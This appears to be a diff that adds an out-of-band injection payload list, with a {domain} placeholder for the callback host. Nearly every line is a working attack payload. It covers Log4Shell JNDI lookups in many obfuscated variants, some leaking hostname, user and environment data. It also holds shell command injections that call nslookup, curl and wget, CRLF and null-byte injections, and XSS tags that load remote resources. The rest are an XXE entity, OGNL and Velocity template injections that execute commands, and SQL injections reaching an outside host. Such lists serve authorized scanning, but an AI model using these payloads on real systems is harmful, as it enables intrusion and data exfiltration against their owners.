@@ -1,0 +1,68 @@
+${jndi:ldap://l4j-ldap-01.{domain}/a}
+${jndi:rmi://l4j-rmi-01.{domain}/a}
+${jndi:dns://l4j-dns-01.{domain}/a}
+${jndi:ldaps://l4j-ldaps-01.{domain}/a}
+${jndi:iiop://l4j-iiop-01.{domain}/a}
+${jndi:corba://l4j-corba-01.{domain}/a}
+${jndi:ldap://${hostName}.l4j-host-01.{domain}/a}
+${${lower:j}ndi:ldap://l4j-low-01.{domain}/a}
+${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://l4j-low4-01.{domain}/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://l4j-colon-01.{domain}/a}
+${${env:BARFOO:-j}ndi:ldap://l4j-env-01.{domain}/a}
+${${kank:-j}ndi:ldap://l4j-kank-01.{domain}/a}
+${${lower:${lower:jndi}}:ldap://l4j-lowlow-01.{domain}/a}
+${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://l4j-up4-01.{domain}/a}
+${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://l4j-lowproto-01.{domain}/a}
+${${date:j}${date:n}${date:d}${date:i}:ldap://l4j-date-01.{domain}/a}
+${${sys:foo:-j}${sys:foo:-n}${sys:foo:-d}${sys:foo:-i}:ldap://l4j-sys-01.{domain}/a}
+${j${eNv:KANK:-}ndi:ldap://l4j-mixed-01.{domain}/a}
+${${::-j}${::-n}${::-d}${::-i}${::-:}${::-l}${::-d}${::-a}${::-p}://l4j-colon-full-01.{domain}/a}
+${j${::-n}di:ldap://l4j-colon-half-01.{domain}/a}
+x${jndi:ldap://l4j-wrap-01.{domain}/a}x
+${jndi:ldap://127.0.0.1#l4j-hash-01.{domain}/a}
+${${lower:J}${lower:N}${lower:D}${lower:I}:ldap://l4j-mixcase-01.{domain}/a}
+detect-echo-01-${java:version}-${sys:user.name}-${env:PATH}
+fmt-probe-01-%C:%M:%L:%d{HH:mm:ss}-end
+fmt-probe-02-${${java:runtime}}-end
+<nsc><x${jndi:ldap://l4j-nsc-01.{domain}/a}/y></nsc>
+<style>${jndi:ldap://l4j-style-01.{domain}/a}</style>
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}${::-:}${::-/}${::-/}l4j-colonpath-01.{domain}/a}
+${${:-j}${:-n}${:-d}${:-i}:ldap://l4j-minus-01.{domain}/a}
+${${env:X:-j}${env:X:-n}${env:X:-d}${env:X:-i}:dns://l4j-envdns-01.{domain}/a}
+${jndi:ldap://${file:/etc/hostname}.l4j-file-01.{domain}/a}
+;nslookup cmd-ns-01.{domain};
+|nslookup cmd-ns-02.{domain}|
+$(nslookup cmd-ns-03.{domain})
+`nslookup cmd-ns-04.{domain}`
+&& nslookup cmd-ns-05.{domain}
+;curl http://cmd-curl-01.{domain}/a;
+;wget http://cmd-wget-01.{domain}/a;
+$(curl http://cmd-curl-02.{domain}/b)
+$(ping -c 1 cmd-ping-01.{domain})
+;dig cmd-dig-01.{domain};
+%0anslookup cmd-newline-01.{domain}%0a
+" || nslookup cmd-shell-or-01.{domain} & "
+'image=crlf-pct-01%0d%0aFORGED-BY-TOKEN-CRLF01'
+crlf-pct-02%0d%0aFORGED-BY-TOKEN-CRLF02
+crlf-pct-03%0aFORGED-BY-TOKEN-CRLF03
+crlf-esc-01\r\nFORGED-BY-TOKEN-CRLF04
+crlf-u2028-01 FORGED-BY-TOKEN-U2028
+crlf-u2029-01 FORGED-BY-TOKEN-U2029
+crlf-null-01%00FORGED-BY-TOKEN-NULL
+<img src="http://xss-img-01.{domain}/a">
+<script src="http://xss-script-01.{domain}/a"></script>
+<iframe src="http://xss-frame-01.{domain}/a"></iframe>
+<link rel="stylesheet" href="http://xss-css-01.{domain}/a">
+<meta http-equiv="refresh" content="0;url=http://xss-meta-01.{domain}/a">
+<video src="http://xss-video-01.{domain}/a"></video>
+<div style="background:url(http://xss-bg-01.{domain}/a)">x</div>
+[link](http://xss-md-01.{domain}/a)
+![img](http://xss-md-02.{domain}/a)
+<!DOCTYPE a [<!ENTITY xxe-01 SYSTEM "http://xxe-01.{domain}/a">]>
+%{(#_='multipart').(#fmInlineUtil=new java.lang.ProcessBuilder({'nslookup','tpl-fm-01.{domain}'})).start()}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('nslookup tpl-vt-01.{domain}'))
+${request}__${application}__${session}__${servletContext}
+' UNION SELECT LOAD_FILE(CONCAT('\\\\sqli-mysql-01.','ok','.{domain}'))-- -
+';EXEC master..xp_dirtree '\\sqli-mssql-01.{domain}\a'--
+'||UTL_HTTP.REQUEST('http://sqli-oracle-01.{domain}/a')||'
+http://trace-all-01.{domain}/baseline
